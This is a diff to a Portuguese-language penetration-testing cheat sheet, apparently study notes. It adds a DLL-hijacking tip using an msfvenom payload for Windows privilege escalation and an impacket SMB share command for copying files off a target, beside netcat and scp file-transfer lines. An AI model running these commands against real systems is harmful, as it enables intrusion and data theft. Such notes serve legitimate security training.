@@ -4731,7 +4731,7 @@ Diffie-Hellman `CVE-2019-1388` Vulnerabilidade que tem um executável, já inclu
 
 - Windows PrivEsc: Serviços I e II
 
-É uma falha onde você após estar com a shell, vai tentar identificar onde há serviços que são manipuláveis pelo seu usuário atual, alterando o path dele com um comando para injetar uma shell nele e ganhar acesso a nível de sistema...
+É uma falha onde você após estar com a shell, vai tentar identificar onde há serviços que são manipuláveis pelo seu usuário atual, alterando o path dele com um comando para injetar uma shell nele e ganhar acesso a nível de sistema... DllHijack, trocar o path da dll que esta com notfound e colocar a dll gerada no msfvenom
 
     wmic service get Name,State,PathName | findstr "Runing" | findstr "Program"
 
@@ -5565,13 +5565,14 @@ Fuzzing de SUBDOMINIOS
 
         https://github.com/netsecurity-as/subfuz
 
-Transferir arquivos do alvo para o atacante:
+Transferir arquivos do alvo para o atacante / copiar arquivos:
 
         netcat nc porta > file.etx | nc.exe -v ip porta < file.ext
         python httpserver
         Montar disco na maquina alvo para transferir arquivos 
         Colocar no site que tiver aberto e baixar
         Transferir via ssh scp file.ext user@ip:/home/user
+	impacket-smbserver folder2share . -smb2support -> copy \\IP-SMB-SHARE\folder2share\file.ext 
 
 TIPO DE ARQUIVO PARA GOBUSTER DIRB BURPSUIT
 
